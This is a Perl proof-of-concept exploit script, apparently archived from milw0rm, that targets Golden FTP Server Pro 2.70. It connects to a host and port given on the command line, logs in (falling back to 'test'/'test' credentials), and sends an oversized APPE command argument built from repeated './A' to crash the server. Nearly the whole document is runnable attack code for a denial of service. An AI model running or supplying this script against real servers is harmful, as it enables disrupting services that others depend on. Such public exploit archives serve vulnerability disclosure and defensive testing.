#!/usr/bin/perl

#
-----------------------------------------------------------------------------------------
# Golden FTP Server Pro 2.70 Remote APPE command PoC exploit : DoS
# /JA
# https://www.securinfos.info
#
-----------------------------------------------------------------------------------------

use Net::FTP;

$host = @ARGV[0];
$port = @ARGV[1];
$debug = @ARGV[2];
$user = @ARGV[3];
$pass = @ARGV[4];

if (($host) && ($port)) {

# Exploit string (try with a different value if needed)
$exploit_string = "./A" x 1000;

      print "Trying to connect to $host:$port\n";
      $sock = Net::FTP->new("$host",Port => $port, TimeOut => 60, Debug=> $debug) or die "[-] Connection failed\n";
      print "[+] Connect OK!\n";
      print "Logging...\n";
      if (!$user) {
           $user = "test";
           $pass = "test";
      }
      $sock->login($user, $pass);
      sleep(1);
      $answer = $sock->message;
      print $answer ."\n";
      print "Sending string...\n";
      $sock->quot("APPE",$exploit_string);
} else {
      print "Golden FTP Server Pro 2.70 - Remote APPE command PoC
exploit : DoS\nhttps://www.securinfos.info\n\nUsing: $0 host port [debug: 1 or 0] username password\n\n";
}

# milw0rm.com [2006-05-03]